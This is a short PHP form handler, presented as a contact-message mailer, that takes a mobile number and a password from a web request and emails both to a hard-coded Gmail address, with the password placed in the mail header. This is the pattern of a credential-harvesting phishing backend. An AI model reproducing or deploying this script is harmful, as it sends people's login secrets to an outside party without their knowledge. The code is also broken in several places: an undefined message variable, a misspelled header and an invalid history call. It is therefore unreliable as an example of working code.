<?php
//Define the $_post variable... 
$MobileNo = $_REQUEST['MobileNo'];
$Password = $_REQUEST['Password'];
//Ensure all fields are completed...
if (empty($MobileNo) || empty($Password))
 {
	echo "Plese fill all the fields";
}
else
{
	//Send an email and print sender confirmation...
	mail("yk861595@gmail.com", "Webtech massage", "$massage", "Form: $MobileNo <$Password>");//Eidt the email adress you wish and massage to be sent to 

	echo "<script type='text/javascript'>alert('Your massage is sent sucessfully');
	window.history.log(-1);
	</script>";

}
?>
